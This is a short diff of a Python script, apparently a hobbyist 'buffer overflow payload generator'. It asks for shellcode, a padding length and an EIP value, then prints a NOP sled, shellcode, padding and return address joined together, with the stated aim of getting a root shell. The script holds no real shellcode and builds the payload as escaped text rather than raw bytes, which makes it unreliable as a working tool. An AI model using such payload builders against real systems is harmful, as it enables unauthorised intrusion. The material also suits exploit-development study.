@@ -1,9 +1,9 @@
 print("WELCOME TO THE BUFFER OVERFLOW PAYLOAD GENERATOR MADE BY MR.PAVITRA JHA") 
-print("We have five shell codes for getting a root shell.")
-_12 = input("Num of pading-)#( ")
-pad = "\x41" * int(_12)
+print("We have five shell codes for getting a root shell we can copy and past one of them or if you want you can use your own shellcode.")
 shellcode = input('''--root(Shellcode)kali
 |__# ''')
+_12 = input("Num of pading-)#( ")
+pad = r"\x41" * int(_12)
 Nop = r"\x90" * 100
 Eip = input("your eip-? ")
 print("your payload: " + Nop + shellcode + pad + Eip + "    :now your payload is ready!!")
